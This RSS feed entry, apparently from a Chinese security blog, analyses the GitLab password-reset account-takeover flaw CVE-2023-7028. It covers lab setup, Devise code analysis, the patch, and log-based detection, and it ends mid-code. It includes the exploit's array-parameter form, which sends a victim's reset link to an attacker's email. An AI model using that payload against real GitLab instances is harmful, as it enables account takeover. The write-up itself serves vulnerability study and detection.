<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><description>Recent content in 漏洞分析 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sat, 13 Jan 2024 02:11:06 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-7028 GitLab Account Takeover</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</link><pubDate>Sat, 13 Jan 2024 02:11:06 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</guid><description><h3 id="基本信息">基本信息</h3><p>Gitlab中可以通过重置密码接口发送恶意请求，当已知注册邮箱且开启邮箱登录时，攻击者可以获取到重置密码链接，从而重置目标账号密码，接管目标账号。</p><h4 id="指纹">指纹</h4><p>hunter</p><pre tabindex="0"><code>web.title="GitLab"</code></pre><h3 id="影响版本">影响版本</h3><ul><li>16.1 to 16.1.5</li><li>16.2 to 16.2.8</li><li>16.3 to 16.3.6</li><li>16.4 to 16.4.4</li><li>16.5 to 16.5.5</li><li>16.6 to 16.6.3</li><li>16.7 to 16.7.1</li></ul><h3 id="环境搭建">环境搭建</h3><pre tabindex="0"><code>docker pull gitlab/gitlab-ce:16.1.0-ce.0
docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.1.0-ce.0</code></pre><p>同时还需要配置SMTP发邮件，这里采用Gmail来发，首先开启2FA，而后设置应用专用密码</p><blockquote><p><a href="https://support.google.com/mail/answer/185833?hl=zh-Hans" target="_blank">https://support.google.com/mail/answer/185833?hl=zh-Hans</a></p></blockquote><p>在/etc/gitlab/gitlab.rb配置邮件配置</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_enable'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_address'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"smtp.gmail.com"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_port'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#ae81ff">587</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_user_name'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"you.email@gmail.com"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_password'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"应用专用密码"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_domain'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"smtp.gmail.com"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_authentication'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"login"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_enable_starttls_auto'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_tls'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#66d9ef">false</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># gitlab_rails['smtp_pool'] = false</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">###! **Can be: 'none', 'peer', 'client_once', 'fail_if_no_peer_cert'**</span></span></span><span style="display:flex;"><span><span style="color:#75715e">###! Docs: http://api.rubyonrails.org/classes/ActionMailer/Base.html</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># gitlab_rails['smtp_openssl_verify_mode'] = 'peer'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_ca_path'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"/etc/ssl/certs"</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'smtp_ca_file'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">"/etc/ssl/certs/ca-certificates.crt"</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">### Email Settings</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_enabled'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">##! If your SMTP server does not like the default 'From: gitlab@gitlab.example.com'</span></span></span><span style="display:flex;"><span><span style="color:#75715e">##! can change the 'From' with this setting.</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_from'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'you.email@gmail.com'</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_display_name'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'display_name'</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_reply_to'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'noreply@noreply.site'</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_subject_suffix'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">''</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_smime_enabled'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#66d9ef">false</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_smime_key_file'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'/etc/gitlab/ssl/gitlab_smime.key'</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_smime_cert_file'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'/etc/gitlab/ssl/gitlab_smime.crt'</span></span></span><span style="display:flex;"><span>gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">'gitlab_email_smime_ca_certs_file'</span><span style="color:#f92672">]</span><span style="color:#f92672">=</span><span style="color:#e6db74">'/etc/gitlab/ssl/gitlab_smime_cas.crt'</span></span></span></code></pre></div><blockquote><p><a href="https://kifarunix.com/configure-gitlab-to-use-gmail-smtp-for-outbound-mails/" target="_blank">https://kifarunix.com/configure-gitlab-to-use-gmail-smtp-for-outbound-mails/</a></p></blockquote><p>在修改配置后，使用<code>gitlab-ctl reconfigure</code>命令重新加载配置文件，并且测试是否可以通过SMTP发送邮件</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gitlab-rails console</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>Notify.test_email<span style="color:#f92672">(</span><span style="color:#e6db74">'username@xxx.com'</span>,<span style="color:#e6db74">'Message Subject'</span>,<span style="color:#e6db74">'Message Body'</span><span style="color:#f92672">)</span>.deliver_now</span></span><span style="display:flex;"><span>Delivered mail 16932d5092738@35a8758e2d8d.mail<span style="color:#f92672">(</span>6085.9ms<span style="color:#f92672">)</span></span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/3.png"/></p><p>Gitlab 默认root用户有一个admin[at]example.com的邮箱，为了避免干扰，需要将默认邮箱换成我们指定的邮箱，参考<a href="https://www.ziji.work/gitlab/gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%97%A5%E5%B8%B8%E7%AE%A1%E7%90%86.html" target="_blank">修改默认邮箱</a></p><pre tabindex="0"><code>gitlab-rails console -e production
Loading production environment (Rails 4.2.8)
irb(main):001:0> user = User.where(id: 1).first
=> #&lt;User id: 1, email: "admin@example.com"......
irb(main):009:0> user.email = 'xxx@xxx.com'
irb(main):011:0> user.save!
=> true
irb(main):011:0> exit</code></pre><p>同时修改/etc/gitlab/gitlab.rb里面的默认邮箱为我们自己的Gmail邮箱。</p><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/4.png"/></p><blockquote><p>吐槽一下国内邮箱，说的就是你163，配一个SMTP还这么麻烦，乱七八糟的验证码，Gmail配置2FA+APP专用密码就行了</p></blockquote><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>信息收集</strong>
GitLab官方通告中解释，该漏洞是源于允许用户通过辅助电子邮件地址重置其密码，在16.1.0中引入。</p><blockquote><p>在 16.1.0 中进行了更改，允许用户通过辅助电子邮件地址重置其密码。该漏洞是电子邮件验证过程中的错误导致的。此修补程序已修复该错误，如上所述，我们实施了许多预防性安全措施来保护客户。</p></blockquote><p>查看<a href="https://gitlab.com/rluna-gitlab/gitlab-ce/-/commit/24d1060c0ae7d0ba432271da98f4fa20ab6fd671" target="_blank">补丁</a>，首先看到补丁对几个测试文件做了修改</p><p><img alt="" src="/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/5.png"/></p><p>看不懂ruby代码，让AI分析</p><p><code>这段 Ruby 代码是一个使用 RSpec 编写的测试套件的一部分，主要测试 send_reset_password_instructions 方法的行为。这个方法的主要功能是向用户发送重置密码的指令。</code><code>首先，代码定义了一些测试用的数据，包括用户的未确认的次要电子邮件地址、未知的电子邮件地址、无效的电子邮件地址、尝试进行 SQL 注入的电子邮件地址，以及另一个用户的已确认和未确认的主要电子邮件地址。</code><code>然后，代码定义了两个共享的测试示例：</code></p><ol><li><code>"sends 'Reset password instructions' email"：这个测试示例包含两个测试用例，分别测试当调用 send_reset_password_instructions 方法时，是否能找到预期的用户，以及是否发送了重置密码指令的电子邮件。</code></li><li><code>"does not send 'Reset password instructions' email"：这个测试示例也包含两个测试用例，分别测试当调用 send_reset_password_instructions 方法时，是否找不到用户（并返回一个带有错误的新用户实例），以及是否没有发送任何电子邮件。</code></li></ol><p><code>这些测试用例通过调用 expect 方法和各种匹配器（如 eq、be_instance_of、be_new_record、not_to be_empty、have_enqueued_mail 和 not_to have_enqueued_mail）来验证 send_reset_password_instructions 方法的行为是否符合预期。</code></p><p><code>这段 Ruby 代码定义了一个名为 EmailHelpers 的模块，该模块包含了一系列的方法，主要用于在测试中帮助处理和验证电子邮件的发送。</code></p><p><code>以下是一些主要方法的解释：</code></p><ul><li><code>sent_to_user(user, recipients: email_recipients)：此方法计算给定用户的通知电子邮件地址在收件人列表中出现的次数。</code></li><li><code>reset_delivered_emails!：此方法清除所有已发送的电子邮件和排队的作业，主要用于在每个测试用例开始前重置状态。</code></li><li><code>expect_only_one_email_to_be_sent(subject:, to:)：此方法验证是否只发送了一封电子邮件，且该电子邮件的主题和收件人是否与预期相符。</code></li><li><code>should_only_email(*users, kind: :to)：此方法验证是否只有指定的用户收到了电子邮件。</code></li><li><code>should_email(user, times: 1, recipients: email_recipients)：此方法验证指定的用户是否收到了预期数量的电子邮件。</code></li><li><code>should_not_email(user, recipients: email_recipients)：此方法验证指定的用户是否没有收到电子邮件。</code></li><li><code>should_not_email_anyone：此方法验证是否没有发送任何电子邮件。</code></li><li><code>email_recipients(kind: :to)：此方法返回所有电子邮件的收件人列表。</code></li><li><code>find_email_for(user)：此方法查找发送给指定用户的电子邮件。</code></li><li><code>have_referable_subject(referable, include_project: true, reply: false)：此方法验证电子邮件的主题是否包含指定的引用信息。</code></li><li><code>enqueue_mail_with(mailer_class, mail_method_name, *args)：此方法验证是否已将指定的电子邮件作业排入队列。</code></li><li><code>expect_sender(user, sender_email: nil)：此方法验证电子邮件的发送者是否与预期的用户相符。</code></li><li><code>expect_service_desk_custom_email_delivery_options(service_desk_setting)：此方法验证电子邮件的发送设置是否与服务台的自定义电子邮件设置相符。</code><code>这个模块主要用于在测试中验证电子邮件的发送行为，确保电子邮件的发送者、收件人、主题等都符合预期。</code></li></ul><p>在gitlab中查找<code>PasswordsController</code>，可以在如下路径找到其代码<code>/opt/gitlab/embedded/lib/ruby/gems/3.0.0/gems/devise-4.8.1/app/controllers/devise/passwords_controller.rb</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">Devise</span><span style="color:#f92672">::</span><span style="color:#66d9ef">PasswordsController</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">DeviseController</span></span></span><span style="display:flex;"><span> prepend_before_action<span style="color:#e6db74">:require_no_authentication</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Render the #edit only if coming from a reset password email link</span></span></span><span style="display:flex;"><span> append_before_action<span style="color:#e6db74">:assert_reset_token_passed</span>,<span style="color:#e6db74">only</span>:<span style="color:#e6db74">:edit</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># GET /resource/password/new</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">new</span></span></span><span style="display:flex;"><span> self<span style="color:#f92672">.</span>resource<span style="color:#f92672">=</span> resource_class<span style="color:#f92672">.</span>new</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># POST /resource/password</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">create</span></span></span><span style="display:flex;"><span> self<span style="color:#f92672">.</span>resource<span style="color:#f92672">=</span> resource_class<span style="color:#f92672">.</span>send_reset_password_instructions(resource_params)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">yield</span> resource<span style="color:#66d9ef">if</span> block_given?</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> successfully_sent?(resource)</span></span><span style="display:flex;"><span> respond_with({},<span style="color:#e6db74">location</span>: after_sending_reset_password_instructions_path_for(resource_name))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> respond_with(resource)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># GET /resource/password/edit?reset_password_token=abcdef</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">edit</span></span></span><span style="display:flex;"><span> self<span style="color:#f92672">.</span>resource<span style="color:#f92672">=</span> resource_class<span style="color:#f92672">.</span>new</span></span><span style="display:flex;"><span> set_minimum_password_length</span></span><span style="display:flex;"><span> resource<span style="color:#f92672">.</span>reset_password_token<span style="color:#f92672">=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:reset_password_token</span><span style="color:#f92672">]</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>其中<code>PasswordsController</code>类和create函数能和后面的审计日志相应。让AI分析这段代码</p><blockquote><p>这段代码是 Ruby on Rails 中 Devise gem 的一部分，用于处理用户密码重置的功能。Devise 是一个灵活的身份验证解决方案，它提供了一套完整的 MVC 解决方案来处理用户注册、登录、密码重置等功能。</p><p><code>Devise::PasswordsController</code> 是一个控制器，它继承自<code>DeviseController</code>。这个控制器主要处理与用户密码相关的请求。</p><p><code>prepend_before_action :require_no_authentication</code> 这行代码表示在执行任何动作之前，都需要先执行<code>require_no_authentication</code> 方法。这个方法的作用是确保用户在尝试重置密码时未登录。</p><p><code>append_before_action :assert_reset_token_passed, only: :edit</code> 这行代码表示只有在执行<code>edit</code> 动作时，才需要执行<code>assert_reset_token_passed</code> 方法。这个方法的作用是确保用户在尝试访问密码重置页面时，提供了有效的重置令牌。</p><p><code>new</code> 动作用于显示密码重置请求的表单。</p><p><code>create</code> 动作用于处理密码重置请求。首先，它会调用<code>resource_class.send_reset_password_instructions(resource_params)</code> 方法发送密码重置指令。然后，如果邮件发送成功，它会重定向到<code>after_sending_reset_password_instructions_path_for(resource_name)</code>，否则，它会重新渲染密码重置请求的表单，并显示错误信息。</p></blockquote><p>可知其主要是调用<code>resource_class.send_reset_password_instructions</code>，其代码在<code>app/models/concerns/recoverable_by_any_email.rb</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Concern that overrides the Devise methods</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># to send reset password instructions to any verified user email</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> RecoverableByAnyEmail</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extend</span><span style="color:#66d9ef">ActiveSupport</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Concern</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> class_methods<span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions</span>(attributes<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span> email<span style="color:#f92672">=</span> attributes<span style="color:#f92672">.</span>delete(<span style="color:#e6db74">:email</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">super</span><span style="color:#66d9ef">unless</span> email</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> recoverable<span style="color:#f92672">=</span> by_email_with_errors(email)</span></span><span style="display:flex;"><span> recoverable<span style="color:#f92672">.</span>send_reset_password_instructions(<span style="color:#e6db74">to</span>: email)<span style="color:#66d9ef">if</span> recoverable<span style="color:#f92672">&amp;.</span>persisted?</span></span><span style="display:flex;"><span> recoverable</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">by_email_with_errors</span>(email)</span></span><span style="display:flex;"><span> record<span style="color:#f92672">=</span> find_by_any_email(email,<span style="color:#e6db74">confirmed</span>:<span style="color:#66d9ef">true</span>)<span style="color:#f92672">||</span><span style="color:#66d9ef">new</span></span></span><span style="display:flex;"><span> record<span style="color:#f92672">.</span>errors<span style="color:#f92672">.</span>add(<span style="color:#e6db74">:email</span>,<span style="color:#e6db74">:invalid</span>)<span style="color:#66d9ef">unless</span> record<span style="color:#f92672">.</span>persisted?</span></span><span style="display:flex;"><span> record</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions</span>(opts<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span> token<span style="color:#f92672">=</span> set_reset_password_token</span></span><span style="display:flex;"><span> send_reset_password_instructions_notification(token, opts)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> token</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions_notification</span>(token, opts<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span> send_devise_notification(<span style="color:#e6db74">:reset_password_instructions</span>, token, opts)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>让AI解释代码
Q:attributes.delete 是什么作用</p><p>A:<code>attributes.delete</code> 是 Ruby 中 Hash 类的一个方法。它的作用是从哈希中删除指定的键并返回其值。如果哈希中不存在该键，那么它将返回<code>nil</code>。
例如，假设我们有一个如下的哈希：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>attributes<span style="color:#f92672">=</span> {<span style="color:#e6db74">email</span>:<span style="color:#e6db74">'test@example.com'</span>, name:<span style="color:#e6db74">'Test'</span> }</span></span></code></pre></div><p>我们可以使用<code>delete</code> 方法删除<code>email</code> 键：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>email<span style="color:#f92672">=</span> attributes<span style="color:#f92672">.</span>delete(<span style="color:#e6db74">:email</span>)</span></span></code></pre></div><p>现在，<code>email</code> 变量的值将是<code>'test@example.com'</code>，并且<code>attributes</code> 哈希将只包含<code>{ name: 'Test' }</code>。</p><p>Q:<code>如果是如下数据"email": ["victim@gmail.com","attacker@gmail.com"]attributes.delete 会获取到什么</code></p><p>A:在你给出的这个例子中，<code>attributes</code> 是一个哈希，其中 &ldquo;email&rdquo; 键的值是一个包含两个字符串的数组。如果你调用<code>attributes.delete("email")</code>，那么它将会删除 &ldquo;email&rdquo; 键并返回其值，即这个包含两个电子邮件地址的数组：<code>["victim@gmail.com", "attacker@gmail.com"]</code>。</p><p>借助AI，其实可以知道了send_reset_password_instructions方法从参数里面获取email对应的值，在恶意请求里面，其会获取到一个数组，包含两个邮件地址。</p><p><em>另外其实注意到，payload里面是<code>user[email][]</code>，正常请求是<code>user[email]</code>，多了一对中括号，询问AI</em></p><p>Q:为什么要使用<code>user[mail][]</code>的形式，正常请求是<code>user[mail]</code></p><p>A:在 HTTP 请求中，使用<code>user[email][]</code> 的形式是为了表示<code>email</code> 是一个数组。这在你想要发送多个电子邮件地址时非常有用。</p><p>例如，如果你想要发送两个电子邮件地址，你可以这样构造你的 POST 请求的 body：</p><pre tabindex="0"><code>user[email][]=xxx@gmail.com&amp;user[email][]=aaa@gmail.com</code></pre><p>这将会被解析为一个名为 &ldquo;user&rdquo; 的哈希，其中包含一个名为 &ldquo;email&rdquo; 的键，其值是一个包含两个电子邮件地址的数组。</p><p>如果你只使用<code>user[email]</code>，那么它将被解析为一个名为 &ldquo;user&rdquo; 的哈希，其中包含一个名为 &ldquo;email&rdquo; 的键，其值是一个字符串。如果你尝试发送多个电子邮件地址，只有最后一个会被保留。</p><p>所以，如果你想要发送多个电子邮件地址，你应该使用<code>user[email][]</code> 的形式。</p><p>通过以上分析，payload利用ruby特性，在HTTP请求中构造<code>user[email]</code>数组，使得后端的email变量包含两个邮件地址，从而泄露受害者的密码重置链接。</p><p><strong>入侵检测</strong></p><p>官方给了审计是否受到攻击的方法：</p><p>审计日志<code>/var/log/gitlab/gitlab-rails/production_json.log</code>是否有对<code>/users/password</code> 路径的 HTTP 请求</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#f92672">"method"</span>:<span style="color:#e6db74">"POST"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"path"</span>:<span style="color:#e6db74">"/users/password"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"format"</span>:<span style="color:#e6db74">"html"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"controller"</span>:<span style="color:#e6db74">"PasswordsController"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"action"</span>:<span style="color:#e6db74">"create"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"status"</span>:<span style="color:#ae81ff">302</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"location"</span>:<span style="color:#e6db74">"http://192.168.32.128/users/sign_in"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"time"</span>:<span style="color:#e6db74">"2024-01-13T09:01:29.874Z"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"params"</span>: [</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">"key"</span>:<span style="color:#e6db74">"authenticity_token"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"value"</span>:<span style="color:#e6db74">"[FILTERED]"</span></span></span><span style="display:flex;"><span> },</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">"key"</span>:<span style="color:#e6db74">"user"</span>,</span></span><span style="display:flex;"><span><span style="color:#f92672">"value"</span>: {</span></span><span style="display:flex;"><span><span style="color:#f92672">"email"</span>: [</span></span><span style="display:flex;"><span><span style="color:#e6db74">"victim@gmail.com"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"attacker@gmail.com"</span></span></span><span style="display:flex;"><span> ]</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ],</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">.....</span></span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>审计日志<a href="https://docs.gitlab.com/ee/administration/logs/#audit_jsonlog" target="_blank">gitlab-rails/audit_json.log</a>中对<code>PasswordsController#create</code> 和<code>target_details</code> 的请求是否包含多个电子邮件地址的 JSON 数组的条目。</p><h4 id="补丁分析">补丁分析</h4><p>查看补丁可知其当<code>attributes[:email]</code>存在时会通过<code>Email.confirmed.find_by</code>判断是否是已确认的邮件地址否则会直接返回，只有确认过的才会通过send_reset_password_instructions发送邮件。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># frozen_string_literal: true</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Concern that overrides the Devise methods to allow reset password instructions</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># to be sent to any users' confirmed secondary emails.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># See https://github.com/heartcombo/devise/blob/main/lib/devise/models/recoverable.rb</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> RecoverableByAnyEmail</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extend</span><span style="color:#66d9ef">ActiveSupport</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Concern</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> class_methods<span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">send_reset_password_instructions</span>(attributes<span style="color:#f92672">=</span> {})</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">super</span><span style="color:#66d9ef">unless</span> attributes<span style="color:#f92672">[</span><span style="color:#e6db74">:email</span><span style="color:#f92672">]</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> email<span style="color:#f92672">=</span><span style="color:#66d9ef">Email</span><span style="color:#f92672">.</span>confirmed<span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">email</span>: attributes<span style="color:#f92672">[</span><span style="color:#e6db74">:email</span><span style="color:#f92672">].</span>to_s)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">super</span><span style="color:#66d9ef">unless</span> email</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> recoverable<span style="color:#f92672">=</span> email<span style="color:#f92672">.</span>user</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> recoverable<span style="color:#f92672">.</span>send_reset_password_instructions(<span style="color:#e6db74">to</span>: email<span style="color:#f92672">.</span>email)</span></span><span style="display:flex;"><span> recoverable</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span 